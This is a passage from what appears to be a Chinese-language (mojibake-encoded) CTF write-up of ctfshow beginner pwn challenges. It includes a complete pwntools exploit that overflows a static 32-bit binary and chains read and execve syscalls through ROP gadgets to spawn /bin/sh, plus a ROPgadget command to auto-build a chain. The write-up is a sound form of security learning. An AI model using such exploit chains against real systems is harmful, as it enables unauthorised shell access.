&lt;p&gt;åœ¨mainå‡½æ•°ä¸­æ²¡çœ‹åˆ°è°ƒç”¨readå‡½æ•°ï¼Œåªèƒ½æˆ‘ä»¬å†™expæ—¶åˆ©ç”¨syscallå»è°ƒç”¨readå‡½æ•°ï¼Œæ­é…gadgetså»è®©readé€šè¿‡å¯„å­˜å™¨å»è¯»å–/bin/shå­—ç¬¦ä¸²ã€‚å¯ä»¥çœ‹åˆ°readå‡½æ•°éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼ŒåŠ ä¸Šè‡ªèº«ç³»ç»Ÿè°ƒç”¨å·ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨eaxã€ebxã€ecxã€edxçš„gadgetsã€‚&lt;/p&gt;
&lt;p&gt;gadgetæŸ¥è¯¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/273.png&#34;
	width=&#34;1335&#34;
	height=&#34;471&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/273_hu_f21142f753693b87.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/273_hu_4bc82d8f24bc116a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;283&#34;
		data-flex-basis=&#34;680px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/274.png&#34;
	width=&#34;1273&#34;
	height=&#34;346&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/274_hu_20e73841a55bd7fd.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/274_hu_a5fd2ee60dfff618.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;367&#34;
		data-flex-basis=&#34;883px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;pop_edx_ecx_ebx_retï¼š0x0806ecb0&lt;/p&gt;
&lt;p&gt;pop_eax_retï¼š0x080bb2c6&lt;/p&gt;
&lt;p&gt;int 0x80ï¼š0x08049421&lt;/p&gt;
&lt;p&gt;è°ƒç”¨readå‡½æ•°ï¼Œreadå‡½æ•°ç³»ç»Ÿè°ƒç”¨å·æ˜¯0x3ï¼Œç”¨eaxå¯„å­˜ï¼Œä¸‰ä¸ªå‚æ•°ç”¨ebxã€ecxã€edxåˆ†åˆ«æš‚æ—¶å¯„å­˜ï¼Œint 0x80å»å¼€å¯æ‰§è¡Œreadå‡½æ•°ï¼ŒæŠŠ&lt;code&gt;/bin/sh&lt;/code&gt;å†™å…¥å†…å­˜bssæ®µåï¼Œæ¥ç€æ‰§è¡Œ&lt;code&gt;execve&lt;/code&gt;å‡½æ•°ï¼Œä¹Ÿæ˜¯ç”¨ä¸€æ ·çš„gadgetsï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/275.png&#34;
	width=&#34;1058&#34;
	height=&#34;390&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/275_hu_de707a3a1df9d98.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/275_hu_e6147e0449921e7b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;è¯»å…¥å­—ç¬¦ä¸²åˆ°bsså†…å­˜æ®µçš„èµ·å§‹åœ°å€:0x080eb000&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;271&#34;
		data-flex-basis=&#34;651px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;readå‡½æ•°çš„è§£é‡Šï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/277.png&#34;
	width=&#34;725&#34;
	height=&#34;299&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/277_hu_5928d148ef09be4f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/277_hu_4f0c279e6ad4b93d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;242&#34;
		data-flex-basis=&#34;581px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a1&lt;/code&gt;ï¼šè¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªæŒ‡å‘å·²æ‰“å¼€æ–‡ä»¶çš„å¼•ç”¨ï¼Œå¸¸è§çš„å€¼æœ‰ï¼š&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt; ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼ˆ&lt;code&gt;stdin&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt; ä»£è¡¨æ ‡å‡†è¾“å‡ºï¼ˆ&lt;code&gt;stdout&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2&lt;/code&gt; ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆ&lt;code&gt;stderr&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;å½“æ‰“å¼€ä¸€ä¸ªæ™®é€šæ–‡ä»¶æˆ–å…¶ä»–ç±»å‹çš„æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªå¤§äº 2 çš„æ–‡ä»¶æè¿°ç¬¦ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;a2&lt;/code&gt;&lt;/strong&gt;ï¼šæŒ‡å‘ç”¨äºå­˜å‚¨è¯»å–æ•°æ®çš„ç¼“å†²åŒºçš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»æ–‡ä»¶æè¿°ç¬¦ &lt;code&gt;a1&lt;/code&gt; æ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­è¯»å–çš„æ•°æ®ï¼Œä¼šè¢«å­˜å‚¨åˆ° &lt;code&gt;a2&lt;/code&gt; æ‰€æŒ‡å‘çš„å†…å­˜åŒºåŸŸä¸­ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;a3&lt;/code&gt;&lt;/strong&gt;ï¼šè¡¨ç¤ºè¦è¯»å–çš„å­—èŠ‚æ•°ï¼Œå³æŒ‡å®šä»æ–‡ä»¶æè¿°ç¬¦ &lt;code&gt;a1&lt;/code&gt; æ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­è¯»å–å¤šå°‘ä¸ªå­—èŠ‚çš„æ•°æ®åˆ° &lt;code&gt;a2&lt;/code&gt; æ‰€æŒ‡å‘çš„ç¼“å†²åŒºä¸­ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ€»çš„æ¥è¯´ï¼Œ&lt;code&gt;read&lt;/code&gt; å‡½æ•°çš„ä½œç”¨å°±æ˜¯ä»æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æ‰€å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œè¯»å–æŒ‡å®šå­—èŠ‚æ•°çš„æ•°æ®åˆ°ç»™å®šçš„ç¼“å†²åŒºä¸­ï¼Œå¹¶ä¸”åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œå¯¹å¼‚æ­¥å–æ¶ˆç­‰æƒ…å†µè¿›è¡Œäº†ä¸€å®šçš„å¤„ç†ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æƒ³èµ·ä¸Šä¸€é¢˜ï¼Œæˆ‘æ€•æœ‰å‘ï¼Œè¿˜ç‰¹å®šå»ç”¨pwngdbè°ƒäº†ä¸‹ï¼Œå‘ç°çœŸæœ‰çŒ«è…»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/276.png&#34;
	width=&#34;1836&#34;
	height=&#34;784&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/276_hu_565afc3bc813c434.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/276_hu_19f03963b000ad83.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;åç§»é‡ä¸º40ï¼ˆåè¿›åˆ¶ï¼‰&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;234&#34;
		data-flex-basis=&#34;562px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™ç¡®å®å’ŒIDAé™æ€åˆ†æçš„åç§»é‡å¤§å°ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸‹æ¬¡çœ‹åˆ°é™æ€ç¼–è¯‘çš„ç¨‹åºæˆ‘ç›´æ¥ç•™ä¸€æ‰‹å¿ƒçœ¼ç”¨pwngdbçœ‹ä¸€çœ¼åç§»é‡å…ˆğŸ˜„ã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28266&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080bb2c6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806ecb0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806F350&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bss&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080eb000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bss&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bss&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;æ‰§è¡Œåï¼Œç¨‹åºä¼šé˜»å¡ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œæ­¤æ—¶å‘é€ &lt;code&gt;bin_sh = &amp;quot;/bin/sh\x00&amp;quot;&lt;/code&gt;ï¼Œ&lt;code&gt;read&lt;/code&gt; ä¼šå°†è¯¥å­—ç¬¦ä¸²å†™å…¥ &lt;code&gt;bss&lt;/code&gt; æ®µï¼ˆ&lt;code&gt;0x080eb000&lt;/code&gt; åœ°å€å¤„ï¼‰ï¼›&lt;/p&gt;
&lt;p&gt;æ­¤æ—¶ &lt;code&gt;bss&lt;/code&gt; åœ°å€æŒ‡å‘çš„å†…å®¹å°±æ˜¯ &lt;code&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/code&gt;ï¼Œæ»¡è¶³ &lt;code&gt;execve&lt;/code&gt; å¯¹ â€œå‘½ä»¤è·¯å¾„å‚æ•°â€ çš„è¦æ±‚ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_073&#34;&gt;PWN_073
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæ„‰å¿«çš„å°è¯•ä¸€ä¸‹ä¸€æŠŠæ¢­å§ï¼ &lt;a class=&#34;link&#34; href=&#34;PWN_073&#34; &gt;PWN_073&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/256.png&#34;
	width=&#34;740&#34;
	height=&#34;195&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/256_hu_3275742cbac66bb4.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/256_hu_22389705e6ff8589.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;379&#34;
		data-flex-basis=&#34;910px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹å‡ºæ¥æ˜¯é™æ€ç¼–è¯‘äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/257.png&#34;
	width=&#34;991&#34;
	height=&#34;479&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/257_hu_261a8f8dceaa8e19.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/257_hu_283078c59db171fe.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;206&#34;
		data-flex-basis=&#34;496px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258.png&#34;
	width=&#34;1840&#34;
	height=&#34;81&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_c3bef381c605e654.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_7af9f22cc3ac88ae.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é™æ€ç¼–è¯‘&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2271&#34;
		data-flex-basis=&#34;5451px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDAåˆ†æmainå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/259.png&#34;
	width=&#34;705&#34;
	height=&#34;210&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/259_hu_ee8d103a764557f5.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/259_hu_c5e2952197f3a5ff.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;335&#34;
		data-flex-basis=&#34;805px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”±äºæ˜¯é™æ€ç¼–è¯‘ï¼Œæˆ‘ä»¬æ— æ³•å†ä½¿ç”¨ret2libcæ¥è¿›è¡Œgetshellï¼Œç¨‹åºä¸­ä¹Ÿæ²¡æœ‰systemå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨ROPgadgetæ¥å¸®åŠ©æˆ‘ä»¬æ„é€ ä¸€ä¸ªROPé“¾ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary pwn --ropchain
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
